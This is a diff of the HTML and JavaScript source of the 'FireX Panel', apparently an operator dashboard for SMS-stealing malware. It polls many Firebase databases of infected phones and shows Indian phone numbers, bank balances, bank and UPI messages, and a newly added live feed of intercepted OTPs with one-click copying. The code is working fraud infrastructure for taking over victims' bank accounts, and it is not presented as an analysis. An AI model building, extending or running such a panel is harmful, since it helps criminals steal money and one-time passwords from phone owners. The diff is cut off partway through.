@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>FireX Panel</title>
+    <title>FireX Panel - Premium</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
 
@@ -17,12 +17,17 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
         body { background-color: var(--bg-dark); color: var(--text-main); min-height: 100vh; overflow-x: hidden; }
 
+        /* --- NAVBAR --- */
         .navbar { padding: 12px 20px; border-bottom: 1px solid var(--border-color); position: sticky; top: 0; z-index: 100; background: var(--bg-dark); display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between; gap: 15px;}
         .logo-area { display: flex; align-items: center; gap: 8px; font-size: 1.2rem; font-weight: 800; letter-spacing: 1.5px; color: #fff; }
         .logo-icon { color: #f97316; font-size: 1.5rem; }
         .search-container { flex-grow: 1; max-width: 400px; display: flex; justify-content: center; }
         .search-bar { background-color: #18181b; border: 1px solid var(--border-color); padding: 10px 15px; border-radius: 8px; color: var(--text-main); width: 100%; outline: none; font-size: 0.85rem; }
         .nav-actions { display: flex; align-items: center; gap: 15px; }
+        
+        .btn-live { background: rgba(168, 85, 247, 0.1); border: 1px solid rgba(168, 85, 247, 0.3); color: var(--accent-purple); padding: 8px 15px; border-radius: 8px; cursor: pointer; font-size: 0.85rem; font-weight: 600; display: flex; align-items: center; gap: 5px; transition: 0.2s; }
+        .btn-live:hover { background: rgba(168, 85, 247, 0.2); }
+        
         .clock { color: #a1a1aa; font-family: monospace; font-size: 0.9rem; border: 1px solid var(--border-color); padding: 5px 10px; border-radius: 6px; display: flex; align-items: center; gap: 5px;}
         .avatar { width: 32px; height: 32px; border-radius: 50%; background: linear-gradient(45deg, #0ea5e9, #2dd4bf); display: flex; align-items: center; justify-content: center; font-weight: bold; color: #000; border: 2px solid #27272a; }
         .btn-logout { background: transparent; border: 1px solid var(--border-color); color: var(--text-muted); padding: 6px 12px; border-radius: 6px; cursor: pointer; font-size: 0.8rem; transition: 0.2s; }
@@ -30,18 +35,22 @@
         .btn-add { background: #121215; border: 1px solid var(--border-color); color: #fff; padding: 8px 15px; border-radius: 8px; cursor: pointer; font-size: 0.85rem; font-weight: 600; display: flex; align-items: center; gap: 5px; transition: 0.2s; }
         .btn-add:hover { background: #18181b; border-color: var(--accent-blue); }
 
+        /* --- STATS ROW --- */
         .stats-row { display: flex; gap: 30px; padding: 15px 20px; border-bottom: 1px solid var(--border-color); background: var(--bg-dark); overflow-x: auto;}
         .stat-item { display: flex; flex-direction: column; gap: 2px; min-width: 60px;}
         .stat-title { font-size: 0.65rem; color: var(--text-muted); text-transform: uppercase; font-weight: 700; letter-spacing: 0.5px; }
         .stat-val { font-size: 1.2rem; font-weight: 700; }
         .stat-val.green { color: var(--accent-green); } .stat-val.red { color: var(--accent-red); } .stat-val.purple { color: var(--accent-purple); }
 
+        /* --- FILTER BAR --- */
         .filter-bar { display: flex; align-items: center; justify-content: space-between; padding: 15px 20px; border-bottom: 1px solid var(--border-color); flex-wrap: wrap; gap: 10px;}
         .filter-left { display: flex; gap: 10px; align-items: center; overflow-x: auto; padding-bottom: 5px; flex-wrap: wrap;}
         .filter-btns { display: flex; gap: 5px; }
         .f-btn { background: transparent; border: none; color: var(--text-muted); padding: 6px 12px; border-radius: 6px; cursor: pointer; font-size: 0.85rem; font-weight: 500; transition: 0.2s; white-space: nowrap;}
         .f-btn:hover { color: var(--text-main); }
         .f-btn.active { background: #27272a; color: #fff; }
+        .f-btn.trusted.active { background: rgba(16, 185, 129, 0.2); color: var(--accent-green); border: 1px solid var(--accent-green); }
+        
         .filter-right { display: flex; align-items: center; gap: 10px; flex-wrap: wrap;}
         .custom-select { background: #121215; border: 1px solid var(--border-color); color: var(--text-main); padding: 6px 10px; border-radius: 6px; outline: none; cursor: pointer; font-size: 0.8rem; max-width: 180px;}
         .refresh-icon { background: #121215; border: 1px solid var(--border-color); width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; border-radius: 6px; cursor: pointer; color: var(--text-muted); transition: 0.2s;}
@@ -49,21 +58,26 @@
         @keyframes spin { 100% { transform: rotate(360deg); } }
         .refresh-icon.loading svg { animation: spin 1s linear infinite; color: var(--accent-green); }
 
+        /* --- GRID & CARDS --- */
         .grid-container { display: grid; grid-template-columns: 1fr; gap: 15px; padding: 20px; }
-        .device-card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 20px; cursor: pointer; transition: 0.2s; position: relative; }
+        .device-card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 20px; cursor: pointer; transition: 0.2s; position: relative; overflow: hidden;}
         .device-card:hover { background: var(--bg-card-hover); border-color: #3f3f46; }
+        
         .card-header { display: flex; justify-content: space-between; margin-bottom: 20px; align-items: center; }
-        .device-id { font-size: 0.95rem; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 10px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;}
+        .device-id { font-size: 0.95rem; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 10px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 200px;}
         .wifi-icon { color: var(--accent-green); font-size: 1.2rem; }
         .dots-icon { color: var(--text-muted); font-size: 1.2rem; cursor: pointer; }
+        
         .card-row { display: flex; justify-content: space-between; margin-bottom: 15px; }
         .data-col { display: flex; flex-direction: column; gap: 4px; }
         .data-label { font-size: 0.65rem; color: var(--text-muted); text-transform: uppercase; font-weight: 700; letter-spacing: 0.5px; }
-        .data-val { font-size: 0.9rem; font-weight: 600; color: #d4d4d8; }
+        .data-val { font-size: 0.9rem; font-weight: 600; color: #d4d4d8; display: flex; align-items: center; gap: 5px;}
+        
         .battery-indicator { display: flex; align-items: center; gap: 6px; font-size: 0.85rem; font-weight: 600; }
         .batt-bar { width: 24px; height: 12px; border: 1px solid var(--text-muted); border-radius: 3px; padding: 1.5px; position: relative; }
         .batt-bar::after { content: ''; position: absolute; right: -3px; top: 3px; width: 2px; height: 4px; background: var(--text-muted); border-radius: 0 1px 1px 0; }
         .batt-fill { height: 100%; border-radius: 1px; }
+
         .balance-box { background: rgba(16, 185, 129, 0.1); border: 1px solid rgba(16, 185, 129, 0.2); border-radius: 8px; padding: 10px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center;}
         .balance-box .bank-name { font-size: 0.75rem; color: var(--accent-green); font-weight: 600; }
         .balance-box .amount { font-size: 1.1rem; font-weight: 700; color: #fff; }
@@ -72,38 +86,58 @@
         .status-text.offline { color: var(--text-muted); }
         .dot { width: 6px; height: 6px; border-radius: 50%; background: currentColor; }
 
+        /* --- BUTTONS --- */
+        .copy-btn { background: transparent; border: none; color: var(--text-muted); cursor: pointer; padding: 2px 5px; border-radius: 4px; transition: 0.2s; display: inline-flex;}
+        .copy-btn:hover { color: #fff; background: rgba(255,255,255,0.1); }
+
+        /* --- SIDE PANEL --- */
         .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); backdrop-filter: blur(3px); opacity: 0; visibility: hidden; transition: 0.3s; z-index: 1000; }
         .overlay.active { opacity: 1; visibility: visible; }
         .side-panel { position: fixed; top: 0; right: -100vw; width: 100vw; height: 100vh; background: #0f0f11; transition: right 0.3s cubic-bezier(0.4, 0, 0.2, 1); z-index: 1001; display: flex; flex-direction: column; }
         .side-panel.active { right: 0; }
+        
         .panel-header { padding: 15px 20px; border-bottom: 1px solid var(--border-color); display: flex; justify-content: space-between; align-items: center; background: #121215; }
         .panel-header-left { display: flex; align-items: center; gap: 12px; }
         .panel-header-icon { width: 36px; height: 36px; background: rgba(16, 185, 129, 0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: var(--accent-green); font-size: 1.2rem;}
         .panel-header-actions { display: flex; gap: 10px; }
         .icon-btn { background: #27272a; border: none; color: var(--text-main); width: 32px; height: 32px; border-radius: 50%; cursor: pointer; display: flex; justify-content: center; align-items: center; font-size: 1rem; }
         .icon-btn.trash { background: rgba(239, 68, 68, 0.1); color: var(--accent-red); }
+        
         .panel-tabs { display: flex; border-bottom: 1px solid var(--border-color); padding: 0 20px; background: #0c0c0e; }
         .p-tab { padding: 14px 15px; color: var(--text-muted); cursor: pointer; font-size: 0.85rem; font-weight: 600; border-bottom: 2px solid transparent; white-space: nowrap; }
         .p-tab.active { color: #fff; border-bottom-color: var(--accent-red); }
         .panel-content { flex: 1; overflow-y: auto; padding: 15px; background: #0c0c0e; }
-        .sms-item { background: #18181b; border: 1px solid var(--border-color); border-radius: 10px; padding: 15px; margin-bottom: 12px; }
+        
+        /* SMS ITEM */
+        .sms-item { background: #18181b; border: 1px solid var(--border-color); border-radius: 10px; padding: 15px; margin-bottom: 12px; position: relative; }
         .sms-item.bank { border-color: rgba(239, 68, 68, 0.3); background: rgba(239, 68, 68, 0.05); }
         .sms-header { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 0.75rem; align-items: center;}
         .sms-sender { font-weight: 700; color: var(--accent-purple); display: flex; align-items: center; gap: 5px;}
         .sms-sender.bank-sender { color: var(--accent-red); }
         .sms-time { color: var(--text-muted); font-family: monospace; font-size: 0.7rem;}
-        .sms-body { font-size: 0.85rem; line-height: 1.5; color: #d4d4d8; word-break: break-word; }
+        .sms-body { font-size: 0.85rem; line-height: 1.5; color: #d4d4d8; word-break: break-word; padding-right: 25px; }
+
         .info-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #27272a; font-size: 0.9rem; }
         .info-label { color: var(--text-muted); font-weight: 500;}
         .empty-state { text-align: center; color: var(--text-muted); margin-top: 30px; font-size: 0.9rem; }
-        .modal { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0.9); background: #121215; padding: 25px; border-radius: 12px; border: 1px solid var(--border-color); z-index: 2000; width: 90%; max-width: 400px; opacity: 0; visibility: hidden; transition: 0.2s; box-shadow: 0 20px 40px rgba(0,0,0,0.8);}
-        .modal.active { transform: translate(-50%, -50%) scale(1); opacity: 1; visibility: visible; }
-        .modal h2 { font-size: 1.1rem; margin-bottom: 10px; color: #fff;}
-        .modal input { width: 100%; padding: 12px; background: #09090b; border: 1px solid var(--border-color); border-radius: 8px; color: white; margin-bottom: 15px; font-size: 0.9rem;}
-        .modal-actions { display: flex; justify-content: flex-end; gap: 10px; }
-        .btn-cancel { background: transparent; border: 1px solid var(--border-color); color: var(--text-main); padding: 10px 16px; border-radius: 6px; cursor: pointer;}
-        .btn-submit { background: var(--accent-green); border: none; color: #000; padding: 10px 16px; border-radius: 6px; cursor: pointer; font-weight: 600;}
 
+        /* --- SKELETON LOADING --- */
+        .skeleton-card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 20px; height: 140px; position: relative; overflow: hidden; }
+        .skeleton-card::after { content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.05), transparent); animation: shimmer 1.5s infinite; }
+        @keyframes shimmer { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
+
+        /* --- LIVE FEED MODAL --- */
+        .live-modal { position: fixed; top: 60px; right: 20px; width: 350px; max-height: 400px; background: #121215; border: 1px solid var(--accent-purple); border-radius: 12px; z-index: 2000; display: none; flex-direction: column; box-shadow: 0 10px 30px rgba(0,0,0,0.8); }
+        .live-modal.active { display: flex; }
+        .live-header { padding: 12px 15px; border-bottom: 1px solid var(--border-color); font-weight: 600; color: var(--accent-purple); display: flex; justify-content: space-between; align-items: center;}
+        .live-list { overflow-y: auto; padding: 10px; flex: 1; }
+        .live-item { background: #18181b; padding: 10px; border-radius: 6px; margin-bottom: 8px; font-size: 0.8rem; border-left: 3px solid var(--accent-purple); cursor: pointer; }
+        .live-item:hover { background: #1f1f22; }
+
+        /* --- TOAST NOTIFICATION --- */
+        #toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: var(--accent-green); color: #000; padding: 10px 20px; border-radius: 20px; font-weight: 600; font-size: 0.9rem; z-index: 9999; display: none; box-shadow: 0 4px 12px rgba(16, 185, 129, 0.4); }
+
+        /* --- DESKTOP --- */
         @media (min-width: 768px) {
             .navbar { flex-wrap: nowrap; padding: 12px 30px; }
             .stats-row { padding: 20px 30px; }
@@ -119,13 +153,24 @@
     <div class="navbar">
         <div class="logo-area"><span class="logo-icon">🔥</span> FIREX PANEL</div>
         <div class="search-container">
-            <input type="text" id="searchInput" class="search-bar" placeholder="🔍 Search devices..." oninput="applyFilters()">
+            <input type="text" id="searchInput" class="search-bar" placeholder="🔍 Search by Number, ID or DB..." oninput="applyFilters()">
         </div>
         <div class="nav-actions">
+            <button class="btn-live" onclick="toggleLiveFeed()">📡 Live Feed</button>
             <button class="btn-add" onclick="openModal()">➕ Add DB</button>
             <div class="clock" id="live-clock">00:00</div>
             <div class="avatar">A</div>
-            <button class="btn-logout" onclick="alert('Logout clicked')">Logout</button>
+        </div>
+    </div>
+
+    <!-- LIVE FEED MODAL -->
+    <div class="live-modal" id="liveFeedModal">
+        <div class="live-header">
+            <span>📡 Live OTP & Message Feed</span>
+            <button style="background:none; border:none; color:#fff; cursor:pointer;" onclick="toggleLiveFeed()">✕</button>
+        </div>
+        <div class="live-list" id="liveFeedList">
+            <div class="empty-state">Waiting for new messages...</div>
         </div>
     </div>
 
@@ -134,7 +179,6 @@
         <div class="stat-item"><span class="stat-title">Online</span><span class="stat-val green" id="stat-online">0</span></div>
         <div class="stat-item"><span class="stat-title">Offline</span><span class="stat-val red" id="stat-offline">0</span></div>
         <div class="stat-item"><span class="stat-title">Bank SMS</span><span class="stat-val purple" id="stat-bank">0</span></div>
-        <div class="stat-item"><span class="stat-title">Cards</span><span class="stat-val" id="stat-cards">0</span></div>
     </div>
 
     <div class="filter-bar">
@@ -143,21 +187,17 @@
                 <button class="f-btn active" onclick="setFilter('All', this)">All</button>
                 <button class="f-btn" onclick="setFilter('Online', this)">Online</button>
                 <button class="f-btn" onclick="setFilter('Offline', this)">Offline</button>
+                <button class="f-btn trusted" onclick="setFilter('Trusted', this)">🛡️ Trusted</button>
             </div>
             <div style="width: 1px; height: 20px; background: #27272a; margin: 0 5px;"></div>
             <div class="filter-btns">
                 <button class="f-btn" onclick="setFilter('Upi', this)">Upi</button>
                 <button class="f-btn" onclick="setFilter('Bank', this)">Bank</button>
-                <button class="f-btn" onclick="setFilter('Card', this)">Card</button>
             </div>
         </div>
         <div class="filter-right">
             <select class="custom-select" id="dbFilterSelect" onchange="setDbFilter(this.value)">
-                <!-- Populated by JS -->
-            </select>
-            <select class="custom-select" id="sortSelect" onchange="applyFilters()">
-                <option value="newest">Newest</option>
-                <option value="oldest">Oldest</option>
+                <!-- Populated by JS with optgroups -->
             </select>
             <button class="refresh-icon" id="refreshBtn" onclick="manualRefresh()" title="Refresh All Data">
                 <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 1 1-9-9c2.52 0 4.93 1 6.74 2.74L21 8"/><path d="M21 3v5h-5"/></svg>
@@ -166,7 +206,10 @@
     </div>
 
     <div class="grid-container" id="deviceGrid">
-        <div class="empty-state">⏳ Loading data...</div>
+        <div class="skeleton-card"></div>
+        <div class="skeleton-card"></div>
+        <div class="skeleton-card"></div>
+        <div class="skeleton-card"></div>
     </div>
 
     <div class="overlay" id="overlay" onclick="closePanel()"></div>
@@ -176,11 +219,10 @@
                 <div class="panel-header-icon">📶</div>
                 <div>
                     <h3 id="panel-device-id" style="font-size:1rem; color:#fff; word-break:break-all;">Device ID</h3>
-                    <div style="font-size:0.75rem; color:var(--text-muted);" id="panel-device-number">Number</div>
+                    <div style="font-size:0.75rem; color:var(--text-muted); display:flex; align-items:center; gap:5px;" id="panel-device-number">Number</div>
                 </div>
             </div>
             <div class="panel-header-actions">
-                <button class="icon-btn trash">🗑️</button>
                 <button class="icon-btn" onclick="closePanel()">×</button>
             </div>
         </div>
@@ -192,21 +234,22 @@
             <div class="p-tab active" id="tab-info" onclick="switchTab('info')">Info</div>
             <div class="p-tab" id="tab-bank" onclick="switchTab('bank')">Bank (0)</div>
             <div class="p-tab" id="tab-sms" onclick="switchTab('sms')">SMS (0)</div>
-            <div class="p-tab" id="tab-send" onclick="switchTab('send')">Send</div>
         </div>
         <div class="panel-content" id="panel-content"></div>
     </div>
 
-    <div class="modal" id="addModal">
+    <div class="modal" id="addModal" style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #121215; padding: 25px; border-radius: 12px; border: 1px solid var(--border-color); z-index: 2000; display:none;">
         <h2>➕ Add Firebase Database</h2>
         <p style="font-size:0.8rem; color:var(--text-muted); margin-bottom:15px;">Enter URL (e.g., https://myapp-default-rtdb.firebaseio.com)</p>
-        <input type="text" id="newFirebaseUrl" placeholder="https://..." />
+        <input type="text" id="newFirebaseUrl" placeholder="https://..." style="width: 100%; padding: 12px; background: #09090b; border: 1px solid var(--border-color); border-radius: 8px; color: white; margin-bottom: 15px;"/>
         <div id="modal-status" style="font-size:0.8rem; margin-bottom:15px; display:none;"></div>
-        <div class="modal-actions">
-            <button class="btn-cancel" onclick="closeModal()">Cancel</button>
-            <button class="btn-submit" onclick="addFirebase()">Verify & Add</button>
+        <div style="display:flex; justify-content:flex-end; gap:10px;">
+            <button onclick="closeModal()" style="background:transparent; border:1px solid var(--border-color); color:#fff; padding:10px 16px; border-radius:6px; cursor:pointer;">Cancel</button>
+            <button onclick="addFirebase()" style="background:var(--accent-green); border:none; color:#000; padding:10px 16px; border-radius:6px; cursor:pointer; font-weight:600;">Verify & Add</button>
         </div>
     </div>
+
+    <div id="toast">✅ Copied to clipboard!</div>
 
     <script>
         let databases = {
@@ -302,24 +345,128 @@
         if(savedDbs) { try { databases = { ...databases, ...JSON.parse(savedDbs) }; } catch(e){} }
 
         let memoryCache = {}; 
+        let dbStatus = {}; // Tracks Active/Inactive
         let allDevices = []; 
         let currentFilter = 'All';
         let currentDbFilter = 'nnnnnn'; 
         let activeDevice = null;
-        let currentFetchSession = 0; // To handle concurrent fetch cancellation
+        let currentFetchSession = 0;
+        let liveFeedActive = false;
 
+        // --- TOAST NOTIFICATION ---
+        function showToast(msg, color = 'var(--accent-green)') {
+            const toast = document.getElementById('toast');
+            toast.innerText = msg;
+            toast.style.background = color;
+            toast.style.display = 'block';
+            setTimeout(() => toast.style.display = 'none', 2000);
+        }
+
+        // --- COPY FUNCTION ---
+        function copyText(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                showToast("✅ Copied: " + text);
+            }).catch(err => {
+                showToast("❌ Failed to copy", "var(--accent-red)");
+            });
+        }
+
+        // --- DROPDOWN INIT ---
         function initDropdown() {
             const select = document.getElementById('dbFilterSelect');
             select.innerHTML = '<option value="ALL">🌐 All Databases</option>';
+            
+            let activeGroup = document.createElement('optgroup');
+            activeGroup.label = "🟢 Active Databases";
+            
+            let inactiveGroup = document.createElement('optgroup');
+            inactiveGroup.label = "🔴 Inactive / Locked";
+
             Object.keys(databases).sort().forEach(dbName => {
                 const option = document.createElement('option');
                 option.value = dbName;
                 option.innerText = `📁 ${dbName}`;
-                select.appendChild(option);
+                
+                // Default to inactive until checked
+                if (dbStatus[dbName] === 'ACTIVE') {
+                    activeGroup.appendChild(option);
+                } else {
+                    inactiveGroup.appendChild(option);
+                }
             });
+            
+            if (activeGroup.children.length > 0) select.appendChild(activeGroup);
+            if (inactiveGroup.children.length > 0) select.appendChild(inactiveGroup);
+            
             select.value = currentDbFilter;
         }
 
+        // --- LIVE FEED LOGIC ---
+        function toggleLiveFeed() {
+            liveFeedActive = !liveFeedActive;
+            document.getElementById('liveFeedModal').classList.toggle('active', liveFeedActive);
+            if (liveFeedActive) updateLiveFeed();
+        }
+
+        function updateLiveFeed() {
+            if (!liveFeedActive) return;
+            let latestMsgs = [];
+            
+            // Gather all messages from cache
+            for (let db in memoryCache) {
+                if (typeof memoryCache[db] !== 'object' || memoryCache[db] === "EMPTY" || memoryCache[db] === "ERROR") continue;
+                
+                let deviceMap = {};
+                processNode(memoryCache[db], deviceMap, db, null, "root");
+                
+                for (let devId in deviceMap) {
+                    let dev = deviceMap[devId];
+                    dev.messages.forEach(m => {
+                        latestMsgs.push({
+                            db: db, id: dev.id, num: dev.number, text: m.text, time: m.rawTime || 0, timeStr: m.time
+                        });
+                    });
+                }
+            }
+            
+            // Sort and take top 10
+            latestMsgs.sort((a,b) => b.time - a.time);
+            let top10 = latestMsgs.slice(0, 10);
+            
+            let listEl = document.getElementById('liveFeedList');
+            if (top10.length === 0) {
+                listEl.innerHTML = '<div class="empty-state">Waiting for new messages...</div>';
+                return;
+            }
+            
+            listEl.innerHTML = '';
+            top10.forEach(m => {
+                listEl.innerHTML += `
+                    <div class="live-item" onclick="jumpToDevice('${m.db}', '${m.id}')">
+                        <div style="color:var(--accent-green); font-weight:600; margin-bottom:4px;">📱 ${formatPhone(m.num || m.id)}</div>
+                        <div style="color:#d4d4d8; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;">${m.text}</div>
+                        <div style="color:var(--text-muted); font-size:0.7rem; margin-top:4px;">${m.timeStr} (${m.db})</div>
+                    </div>
+                `;
+            });
+        }
+
+        function jumpToDevice(dbName, devId) {
+            toggleLiveFeed();
+            if(currentDbFilter !== dbName) {
+                currentDbFilter = dbName;
+                document.getElementById('dbFilterSelect').value = dbName;
+                fetchData().then(() => {
+                    let dev = allDevices.find(d => d.id === devId);
+                    if(dev) openPanel(dev);
+                });
+            } else {
+                let dev = allDevices.find(d => d.id === devId);
+                if(dev) openPanel(dev);
+            }
+        }
+
+        // --- OTHER LOGIC ---
         setInterval(() => {
             const now = new Date();
             let h = now.getHours();
@@ -327,7 +474,10 @@
             let ampm = h >= 12 ? 'pm' : 'am';
             h = h % 12; h = h ? h : 12;
             document.getElementById('live-clock').innerText = `${String(h).padStart(2,'0')}:${m} ${ampm}`;
-        }, 1000);
+            
+            // Auto update live feed every 5 sec if open
+            if(liveFeedActive) updateLiveFeed();
+        }, 5000);
 
         function extractPhone(val) {
             if (typeof val !== 'string' && typeof val !== 'number') return null;
@@ -335,7 +485,6 @@
             if (s.length === 10 && /^[6-9]/.test(s)) return s;
             if (s.length === 11 && s.startsWith('0') && /^[6-9]/.test(s.substring(1))) return s.substring(1);
             if (s.length === 12 && s.startsWith('91') && /^[6-9]/.test(s.substring(2))) return s.substring(2);
-            if (s.length === 13 && s.startsWith('091') && /^[6-9]/.test(s.substring(3))) return s.substring(3);
             return null;
         }
 
@@ -345,7 +494,7 @@
         }
 
         function formatTime(t) {
-            if (!t) return "Unknown";
+            if (!t) return "Unknown Time";
             let dateObj;
             if (typeof t === 'number' || /^\d+$/.test(t)) {
                 let val = parseInt(t);
@@ -369,7 +518,7 @@
         function formatPhone(phone) {
             if (!phone || phone === 'Unknown') return 'Unknown';
             let p = String(phone).replace(/\D/g, '');
-            if (p.length === 10) return `+91 ${p.substring(0,5)} ${p.substring(5)}`;
+            if (p.length === 10) return p.substring(0,5) + " " + p.substring(5); // Jugaad: Hata diya +91
             return phone;
         }
 
@@ -383,21 +532,9 @@
             let deviceMap = {};
             
             if (currentDbFilter !== 'ALL') {
-                // SINGLE DB FETCH
-                document.getElementById('deviceGrid').innerHTML = `<div class="empty-state">⏳ Loading <b>${currentDbFilter}</b>...</div>`;
+                document.getElementById('deviceGrid').innerHTML = `<div class="skeleton-card"></div><div class="skeleton-card"></div>`;
                 
-                if (memoryCache[currentDbFilter]) {
-                    if (memoryCache[currentDbFilter] === "EMPTY") {
-                        document.getElementById('deviceGrid').innerHTML = `<div class="empty-state" style="color:var(--accent-yellow)">📭 Database '<b>${currentDbFilter}</b>' is empty.</div>`;
-                        if(btn) btn.classList.remove('loading');
-                        return;
-                    }
-                    if (memoryCache[currentDbFilter] === "ERROR") {
-                        document.getElementById('deviceGrid').innerHTML = `<div class="empty-state" style="color:var(--accent-red)">🔒 Database '<b>${currentDbFilter}</b>' is locked/deactivated.</div>`;
-                        if(btn) btn.classList.remove('loading');
-                        return;
-                    }
-                    
+                if (memoryCache[currentDbFilter] && memoryCache[currentDbFilter] !== "EMPTY" && memoryCache[currentDbFilter] !== "ERROR") {
                     processNode(memoryCache[currentDbFilter], deviceMap, currentDbFilter, null, "root");
                     allDevices = Object.values(deviceMap);
                     applyFilters();
@@ -406,15 +543,16 @@
                 try {
                     const url = databases[currentDbFilter];
                     const controller = new AbortController();
-                    const timeoutId = setTimeout(() => controller.abort(), 5000); 
+                    const timeoutId = setTimeout(() => controller.abort(), 4000); 
                     const res = await fetch(`${url}/.json`, { signal: controller.signal });
                     clearTimeout(timeoutId);
                     
-                    if (session !== currentFetchSession) return; // Aborted if user changed selection
+                    if (session !== currentFetchSession) return; 
                     
                     if (res.ok) {
                         const data = await res.json();
                         if (data) {
+                            dbStatus[currentDbFilter] = 'ACTIVE';
                             memoryCache[currentDbFilter] = data; 
                             deviceMap = {}; 
                             processNode(data, deviceMap, currentDbFilter, null, "root");
@@ -424,14 +562,14 @@
                                 document.getElementById('deviceGrid').innerHTML = `<div class="empty-state">No valid devices found in '<b>${currentDbFilter}</b>'.</div>`;
                             }
                         } else {
+                            dbStatus[currentDbFilter] = 'INACTIVE';
                             memoryCache[currentDbFilter] = "EMPTY";
                             document.getElementById('deviceGrid').innerHTML = `<div class="empty-state" style="color:var(--accent-yellow)">📭 Database '<b>${currentDbFilter}</b>' is empty.</div>`;
-                            document.getElementById('stat-total').innerText = "0";
                         }
                     } else {
+                        dbStatus[currentDbFilter] = 'INACTIVE';
                         memoryCache[currentDbFilter] = "ERROR";
                         document.getElementById('deviceGrid').innerHTML = `<div class="empty-state" style="color:var(--accent-red)">🔒 Database '<b>${currentDbFilter}</b>' is locked/deactivated.</div>`;
-                        document.getElementById('stat-total').innerText = "0";
                     }
                 } catch(e) {
                     if (session === currentFetchSession) {
@@ -439,14 +577,17 @@
                         document.getElementById('deviceGrid').innerHTML = `<div class="empty-state" style="color:var(--accent-red)">🔒 Failed to load '<b>${currentDbFilter}</b>' (Timeout/Locked).</div>`;
                     }
                 }
+                initDropdown(); // Update dropdown groups
             } else {
-                // ALL DB FETCH
-                document.getElementById('deviceGrid').innerHTML = '<div class="empty-state">⏳ Fast fetching all databases...</div>';
+                document.getElementById('deviceGrid').innerHTML = `
+                    <div class="skeleton-card"></div>
+                    <div class="skeleton-card"></div>
+                    <div class="skeleton-card"></div>
+                `;
+                
                 const entries = Object.entries(databases);
                 let completed = 0;
-                
-                // Concurrent Worker Pool
-                const limit = 15; // Fetch 15 at a time for speed
+                const limit = 15; 
                 const queue = [...entries];
                 
                 const worker = async () => {
@@ -457,17 +598,20 @@
                         if (!memoryCache[name] || memoryCache[name] === "ERROR") {
                             try {
                                 const controller = new AbortController();
-                                const timeoutId = setTimeout(() => controller.abort(), 4000); 
+                                const timeoutId = setTimeout(() => controller.abort(), 3000); 
                                 const res = await fetch(`${url}/.json`, { signal: controller.signal });
                                 clearTimeout(timeoutId);
                                 if (res.ok) {
                                     const data = await res.json();
-                                    memoryCache[name] = data || "EMPTY"; 
+                                    memoryCache[name] = data || "EMPTY";
+                                    dbStatus[name] = data ? 'ACTIVE' : 'INACTIVE';
                                 } else {
                                     memoryCache[name] = "ERROR";
+                                    dbStatus[name] = 'INACTIVE';
                                 }
                             } catch (err) {
                                 memoryCache[name] = "ERROR";
+                                dbStatus[name] = 'INACTIVE';
                             }
                         }
                         
@@ -477,7 +621,6 @@
                         }
                         
                         completed++;
-                        // Update UI at the end or every 20 DBs
                         if (completed === entries.length || completed % 20 === 0) {
                             if (session !== currentFetchSession) return;
                             allDevices = Object.values(deviceMap);
@@ -495,78 +638,14 @@
                 if (session === currentFetchSession) {
                     allDevices = Object.values(deviceMap);
                     applyFilters();
+                    initDropdown(); // Update dropdown groups
                     if (allDevices.length === 0) {
-                        document.getElementById('deviceGrid').innerHTML = '<div class="empty-state">No valid devices found across any database.</div>';
+                        document.getElementById('deviceGrid').innerHTML = '<div class="empty-state">No valid devices found across all databases.</div>';
                     }
                 }
             }
             
             if(btn && session === currentFetchSession) btn.classList.remove('loading');
-        }
-
-        async function refreshActiveDevice() {
-            if (!activeDevice) return;
-            
-            const dbName = activeDevice.dbSource;
-            const dbUrl = databases[dbName];
-            const deviceId = activeDevice.id;
-
-            const btn = document.getElementById('panelRefreshBtn');
-            if (btn) {
-                btn.innerHTML = "⏳...";
-                btn.disabled = true;
-            }
-
-            try {
-                delete memoryCache[dbName]; // Force re-fetch
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 4000); 
-                const res = await fetch(`${dbUrl}/.json`, { signal: controller.signal });
-                clearTimeout(timeoutId);
-                
-                if (res.ok) {
-                    const data = await res.json();
-                    if (data) {
-                        memoryCache[dbName] = data;
-                        let deviceMap = {};
-                        processNode(data, deviceMap, dbName, null, "root");
-                        
-                        if (deviceMap[deviceId]) {
-                            activeDevice = deviceMap[deviceId];
-                            document.getElementById('panel-batt').innerText = activeDevice.battery + "%";
-                            
-                            const activeTabElement = document.querySelector('.p-tab.active');
-                            if (activeTabElement) {
-                                const activeTab = activeTabElement.id.replace('tab-', '');
-                                switchTab(activeTab);
-                            }
-                            // Update background grid
-                            if (currentDbFilter === 'ALL') {
-                                allDevices = Object.values(deviceMap); // might be partial if ALL mode
-                            } else {
-                                allDevices = Object.values(deviceMap);
-                            }
-                            applyFilters();
-                        } else {
-                            alert("Device no longer exists in the database.");
-                            closePanel();
-                        }
-                    } else {
